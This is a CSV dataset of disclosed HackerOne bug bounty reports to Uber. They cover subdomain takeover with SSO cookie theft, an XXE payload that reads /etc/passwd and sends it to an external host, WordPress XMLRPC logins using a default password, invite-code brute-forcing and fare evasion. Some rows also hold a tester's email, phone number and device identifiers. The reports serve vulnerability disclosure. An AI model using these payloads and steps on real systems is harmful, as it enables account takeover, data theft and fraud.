Uber,10001,0.0,over-1b,"$5,000.00",Critical,9.3,Improper Authentication - Generic,Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com,"arneswinnen  submitted a report to Uber.Apr 7th (6 years ago)Summary
This is not a standard vulnerability, but a chain of two more exotic vulnerabilities leading to a full authentication bypass of your SSO login system at auth.uber.com (via saostatic.uber.com). The root cause of this authentication bypass is two-fold:

Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN, but the hostname was not registered there anymore. This allowed me to fully takeover this domain. It is now serving content of my own webserver, both over http and https (highly similar to 175070 - however, I must disagree with ""there are some mitigating factors (cookie scope) that make this not as bad as it might appear at first blush.""). 
Your SSO system at auth.uber.com issues session cookies which are temporarily shared between all https://*.uber.com subdomains through its ""domain=.uber.com"" attribute. Although there were some countermeasures to prevent theft, the current setup still allows leakage of these high-value session cookies to the overtaken subdomain https://saostatic.uber.com in all modern browsers, leading to a full Authentication Bypass (highly similar to 172137).

Security Impact
The security impact of the subdomain takeover is that Uber can be impersonated via this webpage. A valid SSL certificate could easily be generated for this domain via Let's Encrypt, which would make it ideal for e.g. phishing attacks. 
The security impact of the SSO system using shared session cookies for https://.uber.com is, in combination with the subdomain takeover vulnerability, an Authentication Bypass via session hijacking. A victim must be authenticated to auth.uber.com and then visit a webpage under the attacker's control to be exploited successfully - no further interaction is required from the victim, the attack can be performed stealthily without the user noticing or being notified by Uber. The end result is that the attacker can now impersonate the victim on any of the .uber.com which rely on auth.uber.com for authentication, such as riders.uber.com, partners.uber.com, developer.uber.com, bonjour.uber.com, etc. 
# 1. Subdomain Takeover
The subdomain ""saostatic.uber.com"" was (and still is) a CNAME pointing to a AWS Cloudfront CDN server (depending on your location, the latter will resolve differently):
Code 168 BytesWrap lines Copy Download1# nslookup saostatic.uber.com 8.8.8.8
2Server:		8.8.8.8
3Address:	8.8.8.8#53
4
5Non-authoritative answer:
6saostatic.uber.com	canonical name = d3i4yxtzktqr9n.cloudfront.net.
However, the hostname ""saostatic.uber.com"" was not claimed anymore on Cloudfront, resulting in a Cloudfront error page when visiting the subdomain before the takeover:
Image F173887: 1._CloudFront_Error_Page_Indicating_Takeover_Susceptibility.png 31.85 KiBZoom in Zoom out Copy Download
Subsequently, a new Amazon Cloudfront CDN endpoint was created and linked to an attacker-controlled origin server. For the new Cloudfront CDN endpoint, ""saostatic.uber.com"" was designated as hostname successfully:
Image F173885: 2._AWS_CloudFront_Claiming_of_Subdomain.png 208.31 KiBZoom in Zoom out Copy Download
This concluded the subdomain takeover. Visual proof can be found at http://saostatic.uber.com/subdomaintakeoverbyarneswinnen.html (unguessable filename chosen to not negatively affect Uber's reputation during takeover period) :
 Image F173884: 3._Subdomain_Hijacked.png 31.28 KiBZoom in Zoom out Copy Download
#2. Authentication Bypass
In Uber's SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, etc). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication, ensuring the window for theft is small:
 {F202679}
The precious shared session cookie ""_csid"" can thus only be stolen between step 9 and 10, which is a very short period (automatic browser redirect). Although not impossible to exploit, a more convenient flaw was identified that allows the shared session cookie to remain alive after step 9 in the browser's cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie ""_csid"", it is simply ignored. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to directly issue another login scenario starting from step 3 in the above diagram, and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie:
{F202676}
So now an attacker has his/her hands on the victim's ""_csid"" shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued ""_csid"" cookie value in step 9 of the first Uber SSO Login diagram to be logged in as the victim, right? Wrong. There's another countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login 2 diagram:
{F202678}
The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can't steal these values from the victim's browser, but only the ""_csid"" shared session cookie, this means game over, right?
No! An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL to the victim's browser to get the ""_csid"" shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the ""_csid"" temporary session token for the attacker's login scenario in a separate browser, but this works flawlessly. This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above third and last diagram): 
{F202677}
PoC
In the PoC below, the assumption is made that https://saostatic.uber.com is actually serving a valid certificate in the victim's browser, which currently is not the case (so there is currently no actual exposed risk). I figured you might not appreciate that. 

Open the victim's browser & browse to https://riders.uber.com . After being redirected to https://auth.uber.com , login with the victim's credentials so you end up on https://riders.uber.com trips dashboard again.
Open a second browser tab in the victim's browser and browse to https://saostatic.uber.com/prepareuberattack.php . Accept any certificate warnings that you may receive here - again, we're only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, ""Cookie: "" string and a ""Set-Cookie: "" strings underneath each other. This is all info gathered under the hood by the attacker's webserver that is required to login as the victim now.
Open the separate attacker's browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the ""Cookie: ..."" string displayed on prepareuberattack.php and paste it into the request headers. 
The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the ""Set-Cookie: "" lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are properly injected in the attacker's browser. 
You are now logged in as the victim in the attacker's browser 

In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim's browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the PHP page, but store this on the server-side, ready to be abused in a stealthy fashion. 
You can see all these PoC steps executed in attachment ""8. Authentication Bypass PoC video.mp4"", where browser 1 and browser 2 had separate upstream servers and thus even other IP addresses to prove this is a plausible threat. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is also attached (""9. prepareuberattack.php"" and ""10. uberattack.php""). This was written quick & dirty for PoC purposes - I know the code is pretty hacky.
Recommendations

The recommendation for the subdomain takeover is straightforward: remove the dangling DNS CNAME pointer to Amazon CloudFront and the issue is resolved.
The recommendation for the generic Authentication Bypass issue is a bit more problematic. The fact that identities supplied to Service Providers by the Identity Provider are communicated via shared .uber.com cookies make them susceptible for all vulnerabilities that allows insight in cookies on any .uber.com subdomain. This includes remote code execution, subdomain takeover,  debug logs, etc and has a very serious impact on Uber's overall security, even when the subdomain is hosted in a completely isolated environment.
For example, all the mentioned out of scope .uber.com subdomains in the program's listing (bizblog.uber.com, newsroom.uber.com etc) have the inherent ability to bypass authentication of any Uber user, even though they might be remotely managed by an external party with lower security standards than Uber. Ironically enough, any service that wants to benefit from the current Uber SSO system will have to receive a .uber.com subdomain, as this is required by design. This in its turn increases the attack surface for abuse of the generic Authentication Bypass.
On the short term I would recommend fixing the fact that the ""_csid"" cookie can remain alive in a browser once a user is already logged in (although Jack Whitton already showed that CSP could be abused to prevent a victim to make the request back to the Service Provider and invalidate the token, so I wouldn't put too much trust in that). On the mid-to-long term I would advise Uber to migrate to a real OAuth SSO system that communicates identity secrets and proofs by other means than shared cookies, e.g. GET parameters (OAuth ""code"" flow) or window.location.hash values (e.g. OAuth ""access tokens"" flow). 

Let me know if anything is unclear.
Cheers,
Arne Swinnen
https://www.arneswinnen.net5 attachments:F173884: 3._Subdomain_Hijacked.pngF173885: 2._AWS_CloudFront_Claiming_of_Subdomain.pngF173887: 1._CloudFront_Error_Page_Indicating_Takeover_Susceptibility.pngF173939: 9._prepareuberattack.phpF173940: 10._uberattack.phpSummary by arneswinnenTechnical summary: https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/",https://hackerone.com/reports/219205,California,United States,San Francisco,2017,4,7,3,29
Uber,10001,0.0,over-1b,"$2,500.00",High,7.95,Denial of Service,Authorization issue in Google G Suite allows DoS through HTTP redirect,"rijalrojan  submitted a report to Uber.Dec 14th (6 years ago)Summary by rijalrojanUber handled this report in a professional manner. Overall, I love reporting bugs to Uber. Thank you for everyone at Uber who worked on this and sorry for the trouble this bug caused for a while.
https://medium.com/@rojanrijal/this-domain-is-my-domain-g-suite-a-record-vulnerability-b447a90a8de7
Cheers,
@uranium238",https://hackerone.com/reports/191196,California,United States,San Francisco,2016,12,14,18,44
Uber,10001,0.0,over-1b,"$3,000.00",No value,0.0,Violation of Secure Design Principles,Avoiding Surge Pricing,"nikhil_patil  submitted a report to Uber.Mar 23rd (7 years ago)Please have a look at the video in this video link which shows the bug and helps you reproduce the same following the steps. 
As you can see, there is surge of 1.3x in that area. But with this bug, one can avoid the surge. 
To explain the video in brief
First I selected Uber Go with the pickup location as ""Prestige Shantiniketan"" and destination as ""Big Brewsky"". Now the ""Share your car"" fare is 249.91 and ""Get your own car"" fare is 277.68.
Now I go back to the map screen, and I scroll to the area which has no surge. And then I click on ""set pickup location"".
In the confirmation screen, I change the pickup location to ""Prestige Shantiniketan"" (the location with surge) and use the same Destination ""Big Brewsky"". Ta-Da !! Now you can see the price without surge even though there is surge in that area (you can see surge symbol on ""Request Pool"" button). The ""Share your car"" fare is 191.48 and ""Get your own car"" fare is 212.76.
Since the UberPool fare is pre-decided, if one has booked using this bug will end up paying the non-surge price for UberPool.
PS: I've personally tried this loophole once for ""Share your car"" in the UberGo screen and it worked for me.
This bug might even work for ""Get you own car"" or UberX, where the bill generated is considering non-surge price, but I haven't tried it. Although in the fare estimate, it shows the non-surge price in surge areas using the above trick.",https://hackerone.com/reports/125250,California,United States,San Francisco,2016,3,23,5,48
Uber,10001,0.0,over-1b,$500.00,No value,0.0,Command Injection - Generic,"Blind OOB XXE At ""http://ubermovement.com/""","raghav_bisht  submitted a report to Uber.Jul 26th (6 years ago)Test Summary :
POST data was set to <?xml version=""1.0"" encoding=""utf-8""?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM ""http://122.180.248.81/""> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch> 
An HTTP request was initiated for the domain http://122.180.248.81/ which indicates that this script is vulnerable to XXE injection.
NOTE : As it was Blind XXE Test I was Successful in Ping Test for XXE. But unable to retrieve any sensitive information.   
HTTP request details:
IP address: 8.36.86.67
User agent: Java/1.8.0_60
Vulnerable Domain :
http://ubermovement.com/
Vulnerable Link :
http://ubermovement.com/api/search/GeneralSearch
Vulnerable Parameter :
GeneralSearch
Steps To Reproduce :

Go to website : http://ubermovement.com/
Attach burp Suite & start intercepting now, click on search and search...
Grab the GET request
Eg. Original HTTP Request :


GET /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


NOW,

Send request to repeater & change it to POST.
Eg. Original HTTP Request :
POST /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /

Now Add content type :
Eg. Content-type: application/xml

Request will be:
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /

Deploy web server and host ""payload.dtd"" File eg :
payload.dtd :



<?xml version=""1.0"" encoding=""UTF-8""?>
<!ENTITY % all ""<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>"">
%all;


Now Add XXE Payload For confirmation :
<?xml version=""1.0"" encoding=""utf-8""?>
Code 65 BytesWrap lines Copy Download1<!DOCTYPE roottag [ 
2<!ENTITY % file SYSTEM ""file:///etc/passwd"">
<!ENTITY % dtd SYSTEM ""http://122.180.248.81/payload23.dtd"">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>

Request Will Be :
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 214
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: /
<?xml version=""1.0"" encoding=""utf-8""?>
Code 65 BytesWrap lines Copy Download1<!DOCTYPE roottag [ 
2<!ENTITY % file SYSTEM ""file:///etc/passwd"">
<!ENTITY % dtd SYSTEM ""http://122.180.248.81/payload.dtd"">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>
NOTE : If you view your web server logs you will find a 404 error.7 attachments:F107654: payload.dtd.pngF107655: dtd.JPGF107656: Ping_Test_Result.pngF107657: Ping_Test.JPGF107658: XXE-1.JPGF107659: xxe--2.pngF107660: xxe-3.png",https://hackerone.com/reports/154096,California,United States,San Francisco,2016,7,26,16,12
Uber,10001,0.0,over-1b,$750.00,No value,0.0,Violation of Secure Design Principles,Brute-Forcing invite codes  in partners.uber.com ,"mefkan  submitted a report to Uber.Jun 14th (6 years ago)Hi,
//We are going to use this link : https://partners.uber.com/join/?invite_code=xxxxx with GET method.
There are  options to customize codes,
We can do it with only numbers
https://partners.uber.com/join/?invite_code=1 to 10000
Or we can use some words with numbers
https://partners.uber.com/join/?invite_code=uber1 to uber10000
If the source code of  page matches with  <p class=""delta flush"">  that means the invite code exists.Or you can use other working matches.I used the <p class=""delta flush""> in the examples.
So we can brute-force.There are no limits for tries.No captchas no errors
Example links that includes money :
https://partners.uber.com/join/?invite_code=547kkgvcv $500
https://partners.uber.com/join/?invite_code=6w3wt2b8z $300
With no money:
https://partners.uber.com/join/?invite_code=mza5cmjtue
https://partners.uber.com/join/?invite_code=9cy316h6ue
https://partners.uber.com/join/?invite_code=4u8kyjxtue
https://partners.uber.com/join/?invite_code=15xvj
And I will add some examples to attachments.
So an attacker or a hacker could use it for free rides or getting money with uber,can create many accounts with every  invite code.
//The other thing about this vulnerability is you are getting some informations about members.
For example Go that page or request a GET method 
GET https://partners.uber.com/join/?invite_code=uber3958
You'll see in the source code //in Turkish uber version)
Code 246 BytesWrap lines Copy Download1<img src=""https://d297l2q4lq2ras.cloudfront.net/nomad/2014/11/27/20/480x480_id_6dae6e16-0990-4cef-ad6b-1ddf3497d1b4.jpeg"">
2        </div>
3          <h1 class=""flush--bottom"">ignacio alejandro, sizi arabanızla para kazanmanız için davet etti.</h1>
Member Informatins:
ignacio alejandro > This is the name of user who has the invite code.
And you can see the user's image in ""<img src ="".And probably she or he uploaded his/her photo on ""2014/11/27"" which is in the image link.7 attachments:F99334: example1.pngF99335: example2.pngF99336: information.pngF99337: information2.pngF99338: information3.pngF99339: request.pngF99340: bruteforce.pngSummary by mefkanBrute-Force invite codes with using GET method on partners.uber.com",https://hackerone.com/reports/144616,California,United States,San Francisco,2016,6,14,2,21
Uber,10001,0.0,over-1b,"$1,500.00",No value,0.0,Information Disclosure,Bulk UUID enumeration via invite codes,"vijay_kumar  submitted a report to Uber.Jun 16th (6 years ago)It is possible to enumerate UUID via invite code. During signup if we enter invite code then create request's response contains inviter_uuid . As invite codes are public  so attacker can easily enumerate  bulk UUID . 
Here is sample request :-
Code 2.15 KiBWrap lines Copy Download1POST /signup/clients/create HTTP/1.1
2X-Uber-RedirectCount: 0
3X-Uber-DCURL: https://cn-geo1.uber.com/
4User-Agent: client/android/3.104.5
5X-Uber-Origin: android-client
6X-Uber-Device-Location-Latitude: 26.894606
7X-Uber-Device-Location-Longitude: 75.7562847
8Content-Type: application/json; charset=UTF-8
9Host: cn-geo1.uber.com
10Connection: Keep-Alive
11Accept-Encoding: gzip
12Content-Length: 1809
13
14{
15	""deviceData"": {
16		""androidId"": ""b3f675hc5e15531"",
17		""version"": ""3.104.5"",
18		""batteryStatus"": ""discharging"",
19		""carrier"": """",
20		""carrierMcc"": ""404"",
21		""carrierMnc"": ""59"",
22		""simSerial"": ""9915921251419234722"",
23		""cpuAbi"": ""armeabi, armeabi-v7a"",
24		""phoneNumber"": """",
25		""deviceIds"": {
26			""authId"": ""k361075b11131493a6061925"",
27			""permId"": ""k973d2529d728186b9063522cb48d74b"",
28			""deviceImei"": ""851639131157164""
29		},
30		""md5"": ""184ec02b309a23dedfc90f6bfe0dfab"",
31		""ipAddress"": ""192.168.0.171"",
32		""deviceModel"": ""HM NOTE 1LTE"",
33		""deviceOsName"": ""Android"",
34		""deviceOsVersion"": ""4.4.4"",
35		""imsi"": ""50459415423472"",
36		""batteryLevel"": 0.81,
37		""deviceAltitude"": 0.0,
38		""deviceLongitude"": 75.7562847,
39		""deviceLatitude"": 26.894606,
40		""locationServiceEnabled"": true,
41		""mockGpsOn"": false,
42		""emulator"": false,
43		""rooted"": true,
44		""course"": 0.0,
45		""speed"": 0.0,
46		""unknownSources"": false,
47		""horizontalAccuracy"": 24.0,
48		""wifiConnected"": true
49	},
50	""device_ids"": {
51		""device_imei"": ""51639131957164"",
52		""googleAdvertisingId"": ""anba81e-ecde-419a-a1c4-0eb0f6768887""
53	},
54	""altitude"": 0.0,
55	""horizontal_accuracy"": 24.0,
56	""device_mobile_country_iso2"": ""in"",
57	""password"": ""vijay"",
58	""version"": ""3.104.5"",
59	""course"": 0.0,
60	""device_os"": ""4.4.4"",
61	""signup_form"": ""android"",
62	""first_name"": ""Test"",
63	""device_model"": ""HM NOTE 1LTE"",
64	""device_mobile_digits"": """",
65	""signup_session_id"": ""f8eb7f0-5ab5-433b-aa97-88d434fe2224"",
66	""longitude"": 75.7562847,
67	""app"": ""client"",
68	""promotion_code"": ""uber48"",
69	""mobile_country_iso2"": ""IN"",
70	""device_serial_number"": ""9CAE0F2D091"",
71	""speed"": 0.0,
72	""epoch"": 1466074494001,
73	""device_id"": ""r9ee4b0668ccbccdbb454c3c7791ee47"",
74	""email"": ""testh1vijay5@gmail.com"",
75	""last_name"": ""Account"",
76	""device"": ""android"",
77	""token_type"": ""cash"",
78	""latitude"": 26.894606,
79	""language"": ""en_US"",
80	""mobile"": ""97558 47368""
81}
and response is-
Code 4.55 KiBWrap lines Copy Download1{
2	""rider_referral_url"": ""https://www.uber.com/invite/testa207ue"",
3	""last_name"": ""Account"",
4	""driver_referral_url"": ""https://partners.uber.com/drive/?invite_code=testa207ue"",
5	""national_id"": null,
6	""creationtime"": ""2016-06-16T11:03:03.997628+00:00"",
7	""give_get_amount"": ""₹50"",
8	""is_super_admin"": false,
9	""has_confirmed_mobile"": false,
10	""give_get_description"": {
11		""fine_print"": ""Every time a new Uber user signs up with your invite code, they’ll get ₹ 50 off each of their first 2 rides. \nOnce they take their first ride, you'll automatically get ₹ 50 off each of your next 2 rides. \nDiscounts apply automatically in your country and expire 3 months from their issue date. Offer not valid for uberTAXI."",
12		""giver_promotion"": {
13			""headline"": ""Get ₹ 50 off each of your next 2 rides"",
14			""promotion_value_string"": ""₹ 50 off of next 2 rides"",
15			""details"": ""They get ₹ 50 off each of their first 2 rides and you will too, after their first ride."",
16			""award_details"": {
17				""per_trip_max_value"": ""50.000"",
18				""max_value_amount"": ""100.000"",
19				""per_trip_value"": ""50.000"",
20				""type"": ""GiveGetTripCreditPromotion"",
21				""trips"": 2,
22				""currency_code"": ""INR""
23			}
24		},
25		""invite_code"": ""testa207ue"",
26		""receiver_promotion"": {
27			""message_body"": ""I’m giving you ₹ 50 off each of your first 2 Uber rides. To accept, use code ‘testa207ue’ to sign up. Enjoy! Details: https://www.uber.com/invite/testa207ue"",
28			""headline"": ""Get ₹ 50 off each of your first 2 rides"",
29			""promotion_value_string"": ""₹ 50 off first 2 rides"",
30			""message_subject"": ""₹ 50 off each of your first 2 Uber rides"",
31			""award_details"": {
32				""per_trip_max_value"": ""50.000"",
33				""max_value_amount"": ""100.000"",
34				""per_trip_value"": ""50.000"",
35				""type"": ""GiveGetTripCreditPromotion"",
36				""trips"": 2,
37				""currency_code"": ""INR""
38			},
39			""details"": ""Get ₹ 50 off your first 2 Uber rides with invite code 'testa207ue'. Enjoy! Download the app: https://www.uber.com/invite/testa207ue""
40		}
41	},
42	""referral_code"": ""testa207ue"",
43	""confirm_mobile_exempt"": false,
44	""confirm_mobile"": false,
45	""last_selected_payment_google_wallet_uuid"": null,
46	""first_name"": ""Test"",
47	""signup_promo_uuid"": ""6c94e187-fafe-45b3-af8b-a82fa7136e5c"",
48	""has_to_opt_in_sms_notifications"": false,
49	""uuid"": ""05faf97c-ad8f-4986-b504-4ebc63f80c29"",
50	""mobile_local"": ""+91 97558 47368"",
51	""confirm_email"": false,
52	""signup_promo_type"": ""GiveGetTripCreditPromotion"",
53	""picture_url"": ""https://d1w2poirtb3as9.cloudfront.net/default.jpeg"",
54	""country_id"": 77,
55	""language_id"": 1,
56	""promotion_code_id"": 534264309,
57	""last_selected_payment_profile_uuid"": ""073f4714-f999-4253-a3af-2895c783001e"",
58	""role"": ""client"",
59	""location"": ""00000"",
60	""has_confirmed_email"": false,
61	""is_restricted"": false,
62	""client_promotions"": [{
63		""display_date"": ""September 15, 2016"",
64		""code"": ""GG_INVITEE_zshtj4kvue"",
65		""redemption_count"": 0,
66		""updated_at"": ""2016-06-16T11:03:04+00:00"",
67		""promotion_id"": null,
68		""deleted_at"": null,
69		""id"": 314578103,
70		""revoked_at"": null,
71		""auto_applied"": false,
72		""uuid"": ""d56807ec-166b-42bc-8784-234e74b90e55"",
73		""display_location"": ""India"",
74		""promotion_code_id"": null,
75		""is_valid"": true,
76		""short_description"": null,
77		""display_discount"": ""₹ 150 OFF"",
78		""description"": ""Free trip up to ₹150 from Данила"",
79		""expires_at"": ""2016-09-15T11:03:04+00:00"",
80		""applied_by_client_uuid"": ""05faf97c-ad8f-4986-b504-4ebc63f80c29"",
81		""promotion_uuid"": ""6c94e187-fafe-45b3-af8b-a82fa7136e5c"",
82		""promotion_code_uuid"": ""d48cc4d3-d02c-4e61-98d1-e109f52e5b2f"",
83		""custom_user_activation_message"": null,
84		""ends_at"": ""9999-12-31T23:59:59+00:00"",
85		""client_uuid"": ""05faf97c-ad8f-4986-b504-4ebc63f80c29"",
86		""starts_at"": ""2016-02-15T18:30:00+00:00"",
87		""created_at"": ""2016-06-16T11:03:04+00:00""
88	}],
89	""email"": ""testh1vijay5@gmail.com"",
90	""username"": ""testh1vijay5@gmail.com"",
91	""picture"": null,
92	""is_autoban_whitelisted"": false,
93	""mobile_country_iso2"": ""IN"",
94	""gratuity"": ""0.2"",
95	""claimed_mobile_local"": null,
96	""email_confirm"": false,
97	""phone_number_full"": ""+919755847368"",
98	""banned"": false,
99	""mobile_country_id"": 77,
100	""promotion_code_uuid"": ""2ca62e26-06f7-48dc-bf8a-441602eaf91d"",
101	""tenancy"": ""uber/production"",
102	""mobile_country_code"": ""+91"",
103	""credit_balances"": {},
104	""trip_credit_balance_strings"": [],
105	""is_tester"": false,
106	""nickname"": ""testh1vijay5@gmail.com"",
107	""was_upgraded"": false,
108	""signup_promo_id"": 332867,
109	""mobile"": ""9755847368"",
110	""has_american_mobile"": false,
111	""has_opted_in_sms_marketing"": false,
112	""token"": ""e42f75a88fa243cdecfd2cef243f0c4c"",
113	""meta"": {},
114	""referral_url"": ""https://www.uber.com/invite/testa207ue"",
115	""is_admin"": false,
116	""is_temporary_admin"": false,
117	""inviter_uuid"": ""a5efac50-b706-47c7-997d-c992b85095ee"",
118	""last_trip_uuid"": null
119}
Second last line of response contains inviter_uuid .
Please note that uber only allow 3 account per device if we choose payment method as cash. But we can bypass it by taking androidId,simSerial,imsi,googleAdvertisingId,signup_session_id  in variable during Attack.
I  tested with 45 requests and all request were successful. 
Thanks",https://hackerone.com/reports/145150,California,United States,San Francisco,2016,6,16,11,31
Uber,10001,0.0,over-1b,"$2,000.00",No value,0.0,Command Injection - Generic,Bypassing Uber Partner's 3 Cancel Limit,razeeb  submitted a report to Uber.Mar 23rd (7 years ago),https://hackerone.com/reports/125218,California,United States,San Francisco,2016,3,23,2,34
Uber,10001,0.0,over-1b,"$8,000.00",No value,0.0,Improper Authentication - Generic,[CRITICAL] -- Complete Account Takeover,parth  submitted a report to Uber.May 7th (7 years ago),https://hackerone.com/reports/136885,California,United States,San Francisco,2016,5,7,0,6
Uber,10001,0.0,over-1b,"$3,000.00",No value,0.0,Improper Authentication - Generic,Get organization info base on uuid,"severus  submitted a report to Uber.Jul 15th (6 years ago)Hi Uber,
I found issue on https://business.uber.com/server/employees
Step to reproduce:

Send post request to https://business.uber.com/server/employees:
Change userUuid of other user and then see organization info if they has valid organization and their persinol info

Best ragards,
Severus",https://hackerone.com/reports/151465,California,United States,San Francisco,2016,7,15,7,48
Uber,10001,0.0,over-1b,$250.00,No value,0.0,Memory Corruption - Generic,Easy spam with USE My PHONE Feature,"decoder  submitted a report to Uber.Apr 3rd (7 years ago)By this Bug we can easily spam anyone's phone with Uber Sms
We just need to use his/her phone number while registration and Open https://partners.uber.com/dashboard/documents/
so we have 2 option 1st is upload and 2nd is Send Sms on phone
so we can spam anyone's phone by using sms feature
you should use phone number verification process or sms limit in one day   Thanks",https://hackerone.com/reports/127918,California,United States,San Francisco,2016,4,3,4,19
Uber,10001,0.0,over-1b,"$1,000.00",No value,0.0,Privilege Escalation,Subdomain takeover on rider.uber.com due to non-existent distribution on Cloudfront,"fransrosen  submitted a report to Uber.Oct 11th (6 years ago)Hi,
3 hours ago, rider.uber.com was responding like this:
Image F127137: Screen_Shot_2016-10-11_at_07.20.44.png 66.88 KiBZoom in Zoom out Copy Download
This happened on both HTTP and HTTPS. Now, as our blog post from last week says:
https://labs.detectify.com/2016/10/05/the-story-of-ev-ssl-aws-and-trailing-dot-domains/
This means that there's a high chance this domain does not have any distribution at all, and that anyone can now claim it.
I've done this as a PoC now, I haven't placed anything on the apex level, howevel if you use this URL:
http://rider.uber.com/login-poc
There's a PoC there:
Image F127139: Screen_Shot_2016-10-11_at_07.27.47.png 241.50 KiBZoom in Zoom out Copy Download
You should immediately remove the DNS RR, or point it elsewhere, or tell me and I'll remove the Alternate CNAME again on my PoC-distribution.
Regards,
Frans3 attachments:F127137: Screen_Shot_2016-10-11_at_07.20.44.pngF127138: Screen_Shot_2016-10-11_at_07.27.19.pngF127139: Screen_Shot_2016-10-11_at_07.27.47.png",https://hackerone.com/reports/175070,California,United States,San Francisco,2016,10,11,5,28
Uber,10001,0.0,over-1b,"$7,000.00",No value,0.0,Code Injection,OneLogin authentication bypass on WordPress sites via XMLRPC,"jouko  submitted a report to Uber.May 15th (7 years ago)When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password @@@nopass@@@. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.
The OneLogin plugin does prevent logins through the normal wp-login.php page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: wp-login.php?normal=1. The settings did not allow this on the Uber sites I tried.
An attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).
This probably affects most of your WordPress sites. I've confirmed this on love.uber.com and newsroom.uber.com by creating pages and posts (not public) and uploading files.
The XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:
Code 104 BytesWrap lines Copy Download1wp.deleteFile
2wp.editComment
3wp.getOptions
4wp.getUsers
5wp.newPage
6wp.newPost
7wp.setOptions
8wp.uploadFile
Reproducing#
Create an XML file named options.xml containing:
Code 246 BytesWrap lines Copy Download1<?xml version=""1.0""?>
2<methodCall>
3<methodName>wp.getOptions</methodName>
4<params>
5	<param><value>zzz</value></param>
6        <param><value>cbarry@uber.com</value></param>
7        <param><value>@@@nopass@@@</value></param>
8</params>
9</methodCall>
Run the UNIX command:
Code 112 BytesWrap lines Copy Download1curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary ""`cat options.xml`"" -H 'Content-type: application/xml'
You should get the response:
Code 1.03 KiBWrap lines Copy Download1<?xml version=""1.0"" encoding=""UTF-8""?>
2<methodResponse>
3  <params>
4    <param>
5      <value>
6      <struct>
7  <member><name>software_name</name><value><struct>
8  <member><name>desc</name><value><string>Software Name</string></value></member>
9  <member><name>readonly</name><value><boolean>1</boolean></value></member>
10  <member><name>value</name><value><string>WordPress</string></value></member>
11</struct></value></member>
12  <member><name>software_version</name><value><struct>
13  <member><name>desc</name><value><string>Software Version</string></value></member>
14  <member><name>readonly</name><value><boolean>1</boolean></value></member>
15  <member><name>value</name><value><string>4.4.3</string></value></member>
16</struct></value></member>
17  <member><name>blog_url</name><value><struct>
18  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>
19  <member><name>readonly</name><value><boolean>1</boolean></value></member>
20  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>
21...etc.
Exploit scenarios#
Options in the above output that aren't marked readonly can also be changed. I didn't check if this is exploitable.
For usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.
